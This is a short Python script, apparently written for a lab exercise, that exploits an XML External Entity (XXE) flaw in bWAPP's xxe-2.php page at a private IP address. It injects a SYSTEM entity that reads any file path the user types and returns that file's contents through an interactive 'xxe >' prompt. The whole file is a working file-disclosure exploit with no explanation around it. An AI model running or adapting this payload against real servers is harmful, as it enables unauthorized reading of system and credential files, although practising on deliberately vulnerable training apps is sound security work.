#!/usr/bin/python3

import requests, sys, re, cmd

burp = {"http":"http://127.0.0.1:8080"}
cookies = {
	"PHPSESSID":"ec4de8edce82534683cde5f8bf564db4",
	"security_level":"0"
}

def getFile(filename):
	data = f"""<?xml version="1.0" encoding="utf-8"?>
	    <!DOCTYPE test [
	    <!ENTITY xxe SYSTEM "file:///{filename}">
	    ]>
	    <reset><login>
	            &xxe;
	        </login>
	        <secret>
	            Any bus?
	        </secret>
	    </reset>
	"""

	res = requests.post("http://192.168.100.32/bWAPP/xxe-2.php", cookies=cookies, data=data)
	r = re.sub(" ","",res.text)
	output = r.split("'")[0]
	return output

class xxe(cmd.Cmd):
	prompt = "xxe > "
	def default(self, args):
		print(getFile(args))

xxe().cmdloop()


